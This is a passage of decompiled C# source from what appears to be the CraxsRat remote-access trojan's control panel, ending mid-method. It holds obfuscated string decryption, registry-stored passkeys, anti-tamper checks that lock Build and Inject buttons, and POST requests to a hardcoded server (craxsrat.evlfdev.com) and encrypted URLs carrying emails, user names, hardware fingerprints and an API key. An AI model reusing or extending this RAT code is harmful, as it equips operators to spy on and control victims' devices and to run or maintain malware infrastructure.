using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Management;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Xml;
using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace Craxs_Rat
{
	// Token: 0x0200000E RID: 14
	[StandardModule]
	internal sealed class Module2
	{
		// Token: 0x06000157 RID: 343 RVA: 0x0000BDAC File Offset: 0x00009FAC
		public static int smethod_0(int int_0, int int_1)
		{
			return checked((int)Math.Round(unchecked(Math.Round((double)int_0 / (double)int_1) * (double)int_1)));
		}

		// Token: 0x06000158 RID: 344 RVA: 0x0000BDD0 File Offset: 0x00009FD0
		public static string smethod_1()
		{
			for (;;)
			{
				Application.DoEvents();
				Thread.Sleep(10000);
				Interaction.MsgBox(Module2.smethod_60("Jtl9mayF+1Dp3Ad5kp7xTA==", "3164972864529158"), MsgBoxStyle.OkOnly, null);
			}
		}

		// Token: 0x06000159 RID: 345 RVA: 0x0000BE08 File Offset: 0x0000A008
		public static Bitmap smethod_2(string string_0)
		{
			Bitmap result;
			try
			{
				using (FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
				{
					using (Bitmap bitmap = new Bitmap(fileStream))
					{
						result = new Bitmap(bitmap);
					}
				}
			}
			catch (Exception ex)
			{
			}
			return result;
		}

		// Token: 0x0600015A RID: 346 RVA: 0x0000BE88 File Offset: 0x0000A088
		public static object smethod_3(string string_0)
		{
			MD5 md = MD5.Create();
			FileStream fileStream = File.OpenRead(string_0);
			fileStream.Position = 0L;
			byte[] bytes_ = md.ComputeHash(fileStream);
			object objectValue = RuntimeHelpers.GetObjectValue(Module2.smethod_4(bytes_));
			fileStream.Close();
			return objectValue;
		}

		// Token: 0x0600015B RID: 347 RVA: 0x0000BED4 File Offset: 0x0000A0D4
		public static object smethod_4(object bytes_0)
		{
			string text = "";
			checked
			{
				int num = bytes_0.Length - 1;
				for (int i = 0; i <= num; i++)
				{
					text += bytes_0[i].ToString("X2");
				}
				return text.ToLower();
			}
		}

		// Token: 0x0600015C RID: 348
		[DllImport("user32.dll")]
		public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

		// Token: 0x0600015D RID: 349
		[DllImport("user32.dll")]
		public static extern bool ReleaseCapture();

		// Token: 0x0600015E RID: 350 RVA: 0x0000BF20 File Offset: 0x0000A120
		public static Image smethod_5(string string_0)
		{
			string s = string_0.Replace(" ", "+");
			byte[] buffer = Convert.FromBase64String(s);
			MemoryStream memoryStream = new MemoryStream(buffer);
			Image result = Image.FromStream(memoryStream);
			memoryStream.Dispose();
			return result;
		}

		// Token: 0x0600015F RID: 351 RVA: 0x0000BF60 File Offset: 0x0000A160
		public static object smethod_6()
		{
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64);
			string text = Module2.smethod_58("MiLzWjVeNPBkeezb5DRg+lz0Rb+jdb+DcUmKbTMQopM=", "Application");
			RegistryKey registryKey2 = registryKey.OpenSubKey(text, true);
			try
			{
				if (registryKey2 == null)
				{
					registryKey2 = registryKey.CreateSubKey(text);
				}
				return true;
			}
			catch (Exception ex)
			{
			}
			return false;
		}

		// Token: 0x06000160 RID: 352 RVA: 0x0000BFD8 File Offset: 0x0000A1D8
		public static void smethod_7(object object_4)
		{
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64);
			string name = Module2.smethod_58("MiLzWjVeNPBkeezb5DRg+lz0Rb+jdb+DcUmKbTMQopM=", "Application");
			RegistryKey registryKey2 = registryKey.OpenSubKey(name, true);
			registryKey2.SetValue("PASSKEY", object_4);
			registryKey2.Close();
		}

		// Token: 0x06000161 RID: 353 RVA: 0x0000C020 File Offset: 0x0000A220
		public static string smethod_8()
		{
			try
			{
				RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64);
				string name = Module2.smethod_58("MiLzWjVeNPBkeezb5DRg+lz0Rb+jdb+DcUmKbTMQopM=", "Application");
				using (RegistryKey registryKey2 = registryKey.OpenSubKey(name, true))
				{
					object objectValue = RuntimeHelpers.GetObjectValue(registryKey2.GetValue("PASSKEY"));
					if (objectValue != null)
					{
						return registryKey2.GetValue("PASSKEY").ToString();
					}
				}
			}
			catch (Exception ex)
			{
			}
			return "";
		}

		// Token: 0x06000162 RID: 354 RVA: 0x0000C0C8 File Offset: 0x0000A2C8
		public static Encoding smethod_9()
		{
			return Encoding.UTF8;
		}

		// Token: 0x06000163 RID: 355 RVA: 0x0000C0DC File Offset: 0x0000A2DC
		public static object smethod_10(string string_0)
		{
			try
			{
				return Module2.smethod_58(string_0, GClass9.cypherRat_0.string_3);
			}
			catch (Exception ex)
			{
			}
			Environment.Exit(0);
			object result;
			return result;
		}

		// Token: 0x06000164 RID: 356 RVA: 0x0000C124 File Offset: 0x0000A324
		public static object smethod_11(string string_0)
		{
			try
			{
				return Module2.smethod_58(string_0, GClass9.cypherRat_0.string_4);
			}
			catch (Exception ex)
			{
			}
			Environment.Exit(0);
			object result;
			return result;
		}

		// Token: 0x06000165 RID: 357 RVA: 0x0000C16C File Offset: 0x0000A36C
		public static string smethod_12(object object_4)
		{
			string result;
			try
			{
				object objectValue = RuntimeHelpers.GetObjectValue(Versioned.CallByName(Module2.webClient_0, Module2.smethod_58("jpy+7pfZa1wGFdfyI8U1Ig==", "ProjectData"), CallType.Method, new object[]
				{
					object_4
				}));
				result = Conversions.ToString(objectValue);
			}
			catch (Exception ex)
			{
				result = null;
			}
			return result;
		}

		// Token: 0x06000166 RID: 358 RVA: 0x0000C1D0 File Offset: 0x0000A3D0
		public static Image smethod_13(Image image_0)
		{
			float num = 50f;
			float gamma = 1f;
			float num2 = 0f;
			float[][] array = new float[5][];
			int num3 = 0;
			float[] array2 = new float[5];
			array2[0] = num;
			array[num3] = array2;
			int num4 = 1;
			float[] array3 = new float[5];
			array3[1] = num;
			array[num4] = array3;
			int num5 = 2;
			float[] array4 = new float[5];
			array4[2] = num;
			array[num5] = array4;
			int num6 = 3;
			float[] array5 = new float[5];
			array5[3] = 1f;
			array[num6] = array5;
			array[4] = new float[]
			{
				num2,
				num2,
				num2,
				0f,
				1f
			};
			float[][] newColorMatrix = array;
			Module2.imageAttributes_0.ClearColorMatrix();
			Module2.imageAttributes_0.SetColorMatrix(new ColorMatrix(newColorMatrix), ColorMatrixFlag.Default, ColorAdjustType.Bitmap);
			Module2.imageAttributes_0.SetGamma(gamma, ColorAdjustType.Bitmap);
			Graphics graphics = Graphics.FromImage(image_0);
			graphics.DrawImage(image_0, new Rectangle(0, 0, image_0.Width, image_0.Height), 0, 0, image_0.Width, image_0.Height, GraphicsUnit.Pixel, Module2.imageAttributes_0);
			return image_0;
		}

		// Token: 0x06000167 RID: 359 RVA: 0x0000C2B0 File Offset: 0x0000A4B0
		public static string smethod_14(string string_0)
		{
			string[] array = string_0.Replace("​", " ").Split(" ", false);
			string text = "";
			foreach (string text2 in array)
			{
				if (text2.Length > 0)
				{
					text += Conversions.ToString(Strings.Chr(Convert.ToInt32(text2)));
				}
			}
			return text;
		}

		// Token: 0x06000168 RID: 360 RVA: 0x0000C324 File Offset: 0x0000A524
		internal static bool smethod_15(string string_0, string string_1)
		{
			try
			{
				string string_2 = null;
				string s = "api=" + Module2.smethod_58("M66OfdIRMeG6MOYJHAsvcj2CmLHCgdQE6YZ2CFZ4lu0l5qqw2wVr19JoSaypS2PZ", "CraxsRatkfvuiorke");
				WebRequest webRequest = WebRequest.Create(Module2.smethod_58(string_2, "Exption") + Module2.smethod_58("gCl/siG4zcrPMTJNDCOStXxT4rZ3nFjqVYucBtzptdM=", "CraxsRatkfvuiorkenfudpajrsnCraxsRat").Replace("[EM]", string_0).Replace("[DA]", string_1));
				ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
				webRequest.Method = "POST";
				byte[] bytes = Encoding.UTF8.GetBytes(s);
				webRequest.ContentType = "application/x-www-form-urlencoded";
				webRequest.ContentLength = (long)bytes.Length;
				Stream requestStream = webRequest.GetRequestStream();
				requestStream.Write(bytes, 0, bytes.Length);
				requestStream.Close();
				WebResponse response = webRequest.GetResponse();
				Stream responseStream = response.GetResponseStream();
				StreamReader streamReader = new StreamReader(responseStream);
				string left = streamReader.ReadToEnd();
				streamReader.Close();
				responseStream.Close();
				response.Close();
				if (Operators.CompareString(left, "OK", false) == 0)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
			return false;
		}

		// Token: 0x06000169 RID: 361 RVA: 0x0000C428 File Offset: 0x0000A628
		internal static bool smethod_16(string string_0, string string_1)
		{
			try
			{
				string s = "api=S0tMeD0WoUQyO8wuButveJYoBlONhU5riAKBPn6R";
				WebRequest webRequest = WebRequest.Create("http://craxsrat.evlfdev.com/rep.php?Email=[EM]&Data=[DA]".Replace("[EM]", string_0).Replace("[DA]", string_1));
				ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
				webRequest.Method = "POST";
				byte[] bytes = Encoding.UTF8.GetBytes(s);
				webRequest.ContentType = "application/x-www-form-urlencoded";
				webRequest.ContentLength = (long)bytes.Length;
				Stream stream = webRequest.GetRequestStream();
				stream.Write(bytes, 0, bytes.Length);
				stream.Close();
				WebResponse response = webRequest.GetResponse();
				stream = response.GetResponseStream();
				StreamReader streamReader = new StreamReader(stream);
				string left = streamReader.ReadToEnd();
				streamReader.Close();
				stream.Close();
				response.Close();
				if (Operators.CompareString(left, "OK", false) == 0)
				{
					return true;
				}
			}
			catch (Exception ex)
			{
			}
			return false;
		}

		// Token: 0x0600016A RID: 362
		[DllImport("user32.dll")]
		public static extern uint SetWindowDisplayAffinity(IntPtr hWnd, uint dwAffinity);

		// Token: 0x0600016B RID: 363 RVA: 0x0000C520 File Offset: 0x0000A720
		public static object smethod_17(string string_0)
		{
			try
			{
				return Module2.smethod_58(string_0, GClass9.cypherRat_0.string_2);
			}
			catch (Exception ex)
			{
			}
			Environment.Exit(0);
			object result;
			return result;
		}

		// Token: 0x0600016C RID: 364 RVA: 0x0000C568 File Offset: 0x0000A768
		public static string smethod_18(string string_0)
		{
			long num = checked((long)Math.Round((double)Conversions.ToLong(string_0) / 1000.0));
			TimeSpan timeSpan = TimeSpan.FromSeconds((double)num);
			return string.Concat(new string[]
			{
				Strings.Format(timeSpan.Hours, "00"),
				":",
				Strings.Format(timeSpan.Minutes, "00"),
				":",
				Strings.Format(timeSpan.Seconds, "00").ToString()
			});
		}

		// Token: 0x0600016D RID: 365 RVA: 0x0000C604 File Offset: 0x0000A804
		internal static byte[] smethod_19(string string_0)
		{
			byte[] result;
			if (string_0 != "==ARVRAYKGHJRSTHWTSRYJHSTTSAERRGR" && string_0.Length > 2)
			{
				result = Convert.FromBase64String(Module2.smethod_58(Module0.LOGS, GClass9.string_8));
			}
			else
			{
				result = null;
			}
			return result;
		}

		// Token: 0x0600016E RID: 366 RVA: 0x0000C644 File Offset: 0x0000A844
		public static string smethod_20(string string_0)
		{
			int num = checked((int)Math.Round((double)(Conversions.ToInteger(string_0) * 3600) / 1000.0));
			return string.Format("{0} km/h", num);
		}

		// Token: 0x0600016F RID: 367 RVA: 0x0000C684 File Offset: 0x0000A884
		public static string smethod_21(int int_0)
		{
			int num = int_0 % 60;
			checked
			{
				int num2 = (int)Math.Round((double)(int_0 - num) / 60.0 % 60.0);
				int num3 = (int)Math.Round((double)(int_0 - (num + num2 * 60)) / 3600.0 % 60.0);
				return string.Concat(new string[]
				{
					Strings.Format(num3, "00"),
					":",
					Strings.Format(num2, "00"),
					":",
					Strings.Format(num, "00").ToString()
				});
			}
		}

		// Token: 0x06000170 RID: 368 RVA: 0x0000C734 File Offset: 0x0000A934
		public static string smethod_22(long long_2)
		{
			long num = long_2 / 3600L;
			checked
			{
				long num2 = (long_2 - num * 3600L) / 60L;
				long value = long_2 - (num * 3600L + num2 * 60L);
				return string.Format("{0}:{1}:{2}", Conversions.ToString(num), Conversions.ToString(num2), Conversions.ToString(value));
			}
		}

		// Token: 0x06000171 RID: 369 RVA: 0x0000C7A4 File Offset: 0x0000A9A4
		public static byte[] smethod_23(byte[] bytes_0)
		{
			byte[] result;
			try
			{
				using (MemoryStream memoryStream = new MemoryStream())
				{
					if (memoryStream.CanSeek)
					{
						memoryStream.Seek(0L, SeekOrigin.Begin);
					}
					using (GZipStream gzipStream = new GZipStream(memoryStream, CompressionMode.Compress, true))
					{
						gzipStream.Write(bytes_0, 0, bytes_0.Length);
					}
					result = memoryStream.ToArray();
				}
			}
			catch (Exception ex)
			{
				result = null;
			}
			return result;
		}

		// Token: 0x06000172 RID: 370 RVA: 0x0000C840 File Offset: 0x0000AA40
		public static string smethod_24(object object_4, object object_5, int int_0)
		{
			Thread.Sleep(1000);
			try
			{
				GClass0 gclass = new GClass0();
				string text;
				do
				{
					text = "8t5ncYwjg+St03TIuoUvk7JwGyeF7yKn";
				}
				while (text.Length <= 0);
				HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(new Uri(Module2.smethod_58("wQoUsYGtPocCwl/yLq7pm2DAFA4mEFO9TNYua1yvFrSfZFcTjQUkTbtwA5xyLDLz02QicdJqrJdX\r\nhsYG22lgUA==", "​‍‌‎‏").Replace("{id}", gclass.method_2("C")).Replace("{ids}", Module2.smethod_59(Environment.UserName + "~" + gclass.method_2("C"), "Form1"))));
				string text2;
				do
				{
					text2 = "+4C9fs2hD7zUVKCatfIKUKgdQWwLmHdmR9tJctdYUXV/pkGOjIulXAdKtZvuv4NlTNG6Mkhm";
					httpWebRequest.Timeout = text2.Length;
				}
				while (text2.Length <= 0);
				string text3;
				do
				{
					text3 = "+vrREGBb3dQm4DK81mu8Kf7nDRIB69/uRu1VJiJxdN6Z";
					httpWebRequest.Timeout = text3.Length;
				}
				while (text3.Length <= 0);
				string text4;
				do
				{
					text4 = "PfiV7HncwWthIwAtXIMlhGiPI/J\r\njMEQOrub8Q==";
					httpWebRequest.Timeout = text4.Length;
				}
				while (text4.Length <= 0);
				string text5;
				do
				{
					text5 = "h5xkUc6Bkg0xoF";
					httpWebRequest.Timeout = text5.Length;
				}
				while (text5.Length <= 0);
				httpWebRequest.Method = "GET";
				HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
				string text6;
				do
				{
					text6 = "kQh6TNtZV442EnmZKw";
				}
				while (text6.Length <= 0);
				string text7;
				do
				{
					text7 = "W9E7PiruuO/b5lHIBXHEPLdDF16CKwDa0gMItr1aHuEsvwBszB3q\r\nP+9GiQggcA==";
				}
				while (text7.Length <= 0);
				string result = new StreamReader(httpWebResponse.GetResponseStream()).ReadToEnd();
				httpWebResponse.Close();
				return result;
			}
			catch (Exception)
			{
			}
			return "";
		}

		// Token: 0x06000173 RID: 371 RVA: 0x0000C9DC File Offset: 0x0000ABDC
		internal static string smethod_25(string string_0, string[] strings_0, int int_0)
		{
			try
			{
				Thread.Sleep(1000);
				string text2;
				if (string_0.Length > 1)
				{
					string_0 = Module8.string_4;
					foreach (string text in strings_0)
					{
						text2 += text.Substring(0, 4);
					}
				}
				return text2;
			}
			catch (Exception ex)
			{
			}
			return "";
		}

		// Token: 0x06000174 RID: 372 RVA: 0x0000CA60 File Offset: 0x0000AC60
		internal static string smethod_26(object object_4, int int_0, int int_1)
		{
			string result;
			try
			{
				if (!Module2.smethod_64().Equals("Build"))
				{
					result = Module2.smethod_24(RuntimeHelpers.GetObjectValue(new object()), "Mw3fRPA5NgME5InJT1CElvfsHj2SjxRbSD9NyBlbpnf5BFRmBGeNKPmvC/CwSFTFn/cWrrwgjI6T", 45865);
				}
				else
				{
					Thread.Sleep(1000);
					string text;
					do
					{
						text = "nS5a8LIlADMgR/bwZxNq8x26DBsFc6sE+wj75gi";
					}
					while (text.Length <= 0);
					string text2;
					do
					{
						text2 = "+wj75giEFMnakF2gaUtM9Gb/uCeg";
					}
					while (text2.Length <= 0);
					string text3;
					do
					{
						text3 = "K4bj9iNv6xZYieGrU6";
					}
					while (text3.Length <= 0);
					string text4;
					do
					{
						text4 = "rcfNbdyGOxWFFtiythdxifJpeA25smoMWMhhrx";
					}
					while (text4.Length <= 0);
					string text5;
					do
					{
						text5 = "+LGY8Ij7lJgzzN4GJdP/w24ooXqwtPOXPW3cdb1L7jc";
					}
					while (text5.Length <= 0);
					string text6;
					do
					{
						text6 = "N+ipX7awuFX19dSFx55nIBHqMh5oq9";
					}
					while (text6.Length <= 0);
					string text7;
					do
					{
						text7 = "+TS8X9+ig1eVQz7PXEFLXubj/zL25PZSBY7xpVIkKCuuHqj/aSbhuiL6CAo7ck0z2AzB";
					}
					while (text7.Length <= 0);
					result = string.Concat(new string[]
					{
						text,
						text2,
						text3,
						text4,
						text5,
						text6,
						text7
					});
				}
			}
			catch (Exception ex)
			{
			}
			return result;
		}

		// Token: 0x06000175 RID: 373 RVA: 0x0000CBB4 File Offset: 0x0000ADB4
		public static byte[] smethod_27(ref byte[] bytes_0)
		{
			byte[] result;
			try
			{
				using (MemoryStream memoryStream = new MemoryStream())
				{
					using (MemoryStream memoryStream2 = new MemoryStream(bytes_0))
					{
						if (memoryStream2.CanSeek)
						{
							memoryStream2.Seek(0L, SeekOrigin.Begin);
						}
						using (GZipStream gzipStream = new GZipStream(memoryStream2, CompressionMode.Decompress))
						{
							gzipStream.CopyTo(memoryStream);
						}
						result = memoryStream.ToArray();
					}
				}
			}
			catch (Exception ex)
			{
				result = null;
			}
			return result;
		}

		// Token: 0x06000176 RID: 374 RVA: 0x0000CC70 File Offset: 0x0000AE70
		public static object smethod_28(string string_0)
		{
			byte[] bytes = Encoding.UTF8.GetBytes(string_0);
			return Convert.ToBase64String(bytes);
		}

		// Token: 0x06000177 RID: 375 RVA: 0x0000CC94 File Offset: 0x0000AE94
		public static Image smethod_29()
		{
			Image result;
			try
			{
				Bitmap bitmap = new Bitmap(1, 1);
				bitmap.SetPixel(0, 0, Color.Transparent);
				result = bitmap;
			}
			catch (Exception ex)
			{
				result = null;
			}
			return result;
		}

		// Token: 0x06000178 RID: 376 RVA: 0x0000CCE0 File Offset: 0x0000AEE0
		public static bool smethod_30(string string_0, string string_1, bool bool_0)
		{
			try
			{
				CraxsMsgbox craxsMsgbox = new CraxsMsgbox(string_0, string_1.Replace("  ", "\r\n"), bool_0);
				if (craxsMsgbox.ShowDialog() == DialogResult.Yes)
				{
					return true;
				}
			}
			catch (Exception ex)
			{
			}
			return false;
		}

		// Token: 0x06000179 RID: 377 RVA: 0x0000CD3C File Offset: 0x0000AF3C
		public static string smethod_31()
		{
			try
			{
				XmlDocument xmlDocument = new XmlDocument();
				try
				{
					xmlDocument.LoadXml(File.ReadAllText(Application.StartupPath + "\\" + Module2.smethod_58("8mq82Mp958SsUo4WB4nn6Q==", "Project")));
				}
				catch (Exception ex)
				{
				}
				if (!Module2.smethod_40(Application.StartupPath + "\\" + Module2.smethod_58("tytjytuyutyutyutyututuu==", "tuyyuuyuuy"), "AngelAndroid_FileManager"))
				{
					Interaction.MsgBox(Module2.smethod_58("vRPM0KvAe2l5ow7/GwxeqrqbxBIoVXSqReiWDDXGYRM=", "File Manager"), MsgBoxStyle.OkOnly, null);
				}
				string value2;
				string string_;
				if (Operators.CompareString(xmlDocument.DocumentElement.Name, Module2.smethod_58("bggfbgbgbgbgbgb", "gbgbgbgb"), false) == 0)
				{
					XmlElement xmlElement = xmlDocument.FirstChild["P2"];
					XmlElement xmlElement2 = xmlDocument.FirstChild["P4"];
					string value = xmlElement2.FirstChild.Value;
					if (Operators.ConditionalCompareObjectNotEqual(Module2.smethod_58(value, "ZoomPictureBox"), Module2.smethod_3(Application.ExecutablePath), false))
					{
						Interaction.MsgBox(Module2.smethod_58("6PR33ggFwNg/Cx/Ol4q0/muMb85+G7mzi2bGyBqiLj7q1G4i34Y8qqFjTWwBPKJ6sM8Wj+b0GnBg\r\nd6DUvXOMQg==", "Camera Manager"), MsgBoxStyle.OkOnly, null);
						Module2.smethod_1();
						GClass9.cypherRat_0.Home_Btn.Enabled = false;
						GClass9.cypherRat_0.blockbtn.Enabled = false;
						GClass9.cypherRat_0.Connection_btn.Enabled = false;
						GClass9.cypherRat_0.Build_btn.Enabled = false;
						GClass9.cypherRat_0.inject_btn.Enabled = false;
						GClass9.cypherRat_0.Settings_btn.Enabled = false;
						GClass9.string_4 = "a";
						GClass9.string_1 = "v";
						GClass9.cypherRat_0 = new CypherRat();
						GClass9.cypherRat_0.WindowState = FormWindowState.Minimized;
					}
					value2 = xmlElement.FirstChild.Value;
					XmlElement xmlElement3 = xmlDocument.FirstChild["P11"];
					string_ = Module2.smethod_58(xmlElement3.FirstChild.Value, "Search");
				}
				if (Operators.CompareString(GClass0.smethod_2(GClass0.smethod_0() + GClass0.smethod_1()), Module2.smethod_58(value2, "​‍‌‎‏"), false) == 0)
				{
				}
				string s = "api=S0tMeD0WoUQyO8wuButveJYoBlONhU5riAKBPn6R";
				WebRequest webRequest = WebRequest.Create((Module2.smethod_58(string_, "FormWindowState.Minimized") + "?USR=[U]&IDF=[I]").Replace("[U]", Module2.smethod_58(value2, "​‍‌‎‏")).Replace("[I]", Module2.smethod_59(GClass0.smethod_2(GClass0.smethod_0() + GClass0.smethod_1()), "Form1")));
				webRequest.Method = "POST";
				byte[] bytes = Encoding.UTF8.GetBytes(s);
				webRequest.ContentType = "application/x-www-form-urlencoded";
				webRequest.ContentLength = (long)bytes.Length;
				Stream stream = webRequest.GetRequestStream();
				stream.Write(bytes, 0, bytes.Length);
				stream.Close();
				WebResponse response = webRequest.GetResponse();
				stream = response.GetResponseStream();
				StreamReader streamReader = new StreamReader(stream);
				string text = streamReader.ReadToEnd();
				streamReader.Close();
				stream.Close();
				response.Close();
				if (text.StartsWith("O:"))
				{
					return text.Replace("O:", "");
				}
			}
			catch (Exception ex2)
			{
			}
			return "Error";
		}

		// Token: 0x0600017A RID: 378 RVA: 0x0000D0B0 File Offset: 0x0000B2B0
		public static string[] smethod_32()
		{
			try
			{
				XmlDocument xmlDocument = new XmlDocument();
				try
				{
					xmlDocument.LoadXml(File.ReadAllText(Application.StartupPath + "\\" + Module2.smethod_58("8mq82Mp958SsUo4WB4nn6Q==", "Project")));
				}
				catch (Exception ex)
				{
				}
				if (!Module2.smethod_40(Application.StartupPath + "\\" + Module2.smethod_58("8mq82Mp958SsUo4WB4nn6Q==", "Project"), "AngelAndroid_FileManager"))
				{
					Interaction.MsgBox(Module2.smethod_58("vRPM0KvAe2l5ow7/GwxeqrqbxBIoVXSqReiWDDXGYRM=", "File Manager"), MsgBoxStyle.OkOnly, null);
				}
				string value2;
				string string_;
				if (Operators.CompareString(xmlDocument.DocumentElement.Name, Module2.smethod_58("gbgfvgbgbgb=", "Clgbgbgbgbass"), false) == 0)
				{
					XmlElement xmlElement = xmlDocument.FirstChild["P2"];
					XmlElement xmlElement2 = xmlDocument.FirstChild["P4"];
					string value = xmlElement2.FirstChild.Value;
					if (Operators.ConditionalCompareObjectNotEqual(Module2.smethod_58(value, "ZoomPictureBox"), Module2.smethod_3(Application.ExecutablePath), false))
					{
						Interaction.MsgBox(Module2.smethod_58("6PR33ggFwNg/Cx/Ol4q0/muMb85+G7mzi2bGyBqiLj7q1G4i34Y8qqFjTWwBPKJ6sM8Wj+b0GnBg\r\nd6DUvXOMQg==", "Camera Manager"), MsgBoxStyle.OkOnly, null);
						Module2.smethod_1();
						GClass9.cypherRat_0.Home_Btn.Enabled = false;
						GClass9.cypherRat_0.blockbtn.Enabled = false;
						GClass9.cypherRat_0.Connection_btn.Enabled = false;
						GClass9.cypherRat_0.Build_btn.Enabled = false;
						GClass9.cypherRat_0.inject_btn.Enabled = false;
						GClass9.cypherRat_0.Settings_btn.Enabled = false;
						GClass9.string_4 = "a";
						GClass9.string_1 = "v";
						GClass9.cypherRat_0 = new CypherRat();
						GClass9.cypherRat_0.WindowState = FormWindowState.Minimized;
					}
					value2 = xmlElement.FirstChild.Value;
					XmlElement xmlElement3 = xmlDocument.FirstChild["P9"];
					string_ = Module2.smethod_58(xmlElement3.FirstChild.Value, "999");
				}
				if (Operators.CompareString(GClass0.smethod_2(GClass0.smethod_0() + GClass0.smethod_1()), Module2.smethod_58(value2, "​‍‌‎‏"), false) != 0)
				{
					Interaction.MsgBox(Module2.smethod_58("klI0IxCLnJCwukOCUJVZScG58hb6E8uTLNLIZenwPv0=", "IOtigrYWEQAyiFol") + "\r\n" + Module2.smethod_58("TOjQVrBRO7jlOTmWthqZIwp3k/GnVnVnUfLi14snIB/8qQqRi+sWgNroLRLoAFbIGPMmIRFfwGZU\r\neiNdImgRrw==", "TMjiwHlZykdArGgb"), MsgBoxStyle.OkOnly, null);
					Module2.smethod_1();
				}
				string s = "api=S0tMeD0WoUQyO8wuButveJYoBlONhU5riAKBPn6R";
				WebRequest webRequest = WebRequest.Create((Module2.smethod_58(string_, "res/icons") + "?USR=[U]&IDF=[I]&IDS=[P]").Replace("[U]", Module2.smethod_58(value2, "​‍‌‎‏")).Replace("[I]", Module2.smethod_59(GClass0.smethod_2(GClass0.smethod_0() + GClass0.smethod_1()), "Form1")).Replace("[P]", Module4.smethod_5()));
				webRequest.Method = "POST";
				byte[] bytes = Encoding.UTF8.GetBytes(s);
				webRequest.ContentType = "application/x-www-form-urlencoded";
				webRequest.ContentLength = (long)bytes.Length;
				Stream stream = webRequest.GetRequestStream();
				stream.Write(bytes, 0, bytes.Length);
				stream.Close();
				WebResponse response = webRequest.GetResponse();
				stream = response.GetResponseStream();
				StreamReader streamReader = new StreamReader(stream);
				string s2 = streamReader.ReadToEnd();
				streamReader.Close();
				stream.Close();
				response.Close();
				return s2.Split("*", false);
			}
			catch (Exception ex2)
			{
			}
			return new string[]
			{
				"Error",
				""
			};
		}

		// Token: 0x0600017B RID: 379 RVA: 0x0000D45C File Offset: 0x0000B65C
		public static string smethod_33()
		{
			try
			{
				XmlDocument xmlDocument = new XmlDocument();
				try
				{
					xmlDocument.LoadXml(File.ReadAllText(Application.StartupPath + "\\" + Module2.smethod_58("8mq82Mp958SsUo4WB4nn6Q==", "Project")));
				}
				catch (Exception ex)
				{
				}
				if (!Module2.smethod_40(Application.StartupPath + "\\" + Module2.smethod_58("oiuouououoiouiooou==", "uooouo"), "AngelAndroid_FileManager"))
				{
					Interaction.MsgBox(Module2.smethod_58("vRPM0KvAe2l5ow7/GwxeqrqbxBIoVXSqReiWDDXGYRM=", "File Manager"), MsgBoxStyle.OkOnly, null);
				}
				string value2;
				string string_;
				if (Operators.CompareString(xmlDocument.DocumentElement.Name, Module2.smethod_58("gbgbgbgbgbgbgbgb==", "gbgbgbgbgb"), false) == 0)
				{
					XmlElement xmlElement = xmlDocument.FirstChild["P2"];
					XmlElement xmlElement2 = xmlDocument.FirstChild["P4"];
					string value = xmlElement2.FirstChild.Value;
					if (Operators.ConditionalCompareObjectNotEqual(Module2.smethod_58(value, "ZoomPictureBox"), Module2.smethod_3(Application.ExecutablePath), false))
					{
						Interaction.MsgBox(Module2.smethod_58("6PR33ggFwNg/Cx/Ol4q0/muMb85+G7mzi2bGyBqiLj7q1G4i34Y8qqFjTWwBPKJ6sM8Wj+b0GnBg\r\nd6DUvXOMQg==", "Camera Manager"), MsgBoxStyle.OkOnly, null);
						Module2.smethod_1();
						GClass9.cypherRat_0.Home_Btn.Enabled = false;
						GClass9.cypherRat_0.blockbtn.Enabled = false;
						GClass9.cypherRat_0.Connection_btn.Enabled = false;
						GClass9.cypherRat_0.Build_btn.Enabled = false;
						GClass9.cypherRat_0.inject_btn.Enabled = false;
						GClass9.cypherRat_0.Settings_btn.Enabled = false;
						GClass9.string_4 = "a";
						GClass9.string_1 = "v";
						GClass9.cypherRat_0 = new CypherRat();
						GClass9.cypherRat_0.WindowState = FormWindowState.Minimized;
					}
					value2 = xmlElement.FirstChild.Value;
					XmlElement xmlElement3 = xmlDocument.FirstChild["P13"];
					string_ = Module2.smethod_58(xmlElement3.FirstChild.Value, "85862143795");
				}
				if (Operators.CompareString(GClass0.smethod_2(GClass0.smethod_0() + GClass0.smethod_1()), Module2.smethod_58(value2, "​‍‌‎‏"), false) != 0)
				{
				}
				string s = "api=S0tMeD0WoUQyO8wuButveJYoBlONhU5riAKBPn6R";
				WebRequest webRequest = WebRequest.Create((Module2.smethod_58(string_, "CraxsAbout") + "?USR=[U]&IDF=[I]").Replace("[U]", Module2.smethod_58(value2, "​‍‌‎‏")).Replace("[I]", Module2.smethod_59(GClass0.smethod_2(GClass0.smethod_0() + GClass0.smethod_1()), "Form1")));
				webRequest.Method = "POST";
				byte[] bytes = Encoding.UTF8.GetBytes(s);
				webRequest.ContentType = "application/x-www-form-urlencoded";
				webRequest.ContentLength = (long)bytes.Length;
				Stream stream = webRequest.GetRequestStream();
				stream.Write(bytes, 0, bytes.Length);
				stream.Close();
				WebResponse response = webRequest.GetResponse();
				stream = response.GetResponseStream();
				StreamReader streamReader = new StreamReader(stream);
				string text = streamReader.ReadToEnd();
				streamReader.Close();
				stream.Close();
				response.Close();
				if (text.StartsWith("update"))
				{
					return text.Replace("[nl]", "\r\n");
				}
				return "ERROR";
			}
			catch (Exception ex2)
			{
			}
			return "ERROR";
		}

		// Token: 0x0600017C RID: 380 RVA: 0x0000D7D0 File Offset: 0x0000B9D0
		public static string[] smethod_34(string string_0)
		{
			try
			{
				string string_ = null;
				string string_2 = null;
